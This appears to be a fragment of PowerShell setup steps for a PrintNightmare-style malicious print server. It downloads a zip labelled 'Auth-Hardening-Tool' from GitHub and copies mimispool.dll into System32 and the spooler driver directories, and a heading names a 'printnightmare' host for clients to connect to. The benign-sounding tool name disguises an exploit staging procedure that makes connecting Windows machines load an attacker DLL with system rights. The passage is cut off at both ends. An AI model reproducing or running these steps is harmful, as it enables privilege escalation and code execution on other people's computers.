...
Invoke-WebRequest -Uri 'https://github.com/Gareen/Auth-Hardening-Tool/releases/latest/download/Auth-Hardening-Tool_trunk.zip' -OutFile '.\Auth-Hardening-Tool_trunk.zip'
Expand-Archive -Path '.\Auth-Hardening-Tool_trunk.zip' -DestinationPath '.\Auth-Hardening-Tool_trunk'

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\Auth-Hardening-Tool_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\Auth-Hardening-Tool_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
...
#### Any computer with explicit credential to `printnightmare.Gareen.com`
```
$serverName  = 'printnightmare.Gareen.com'
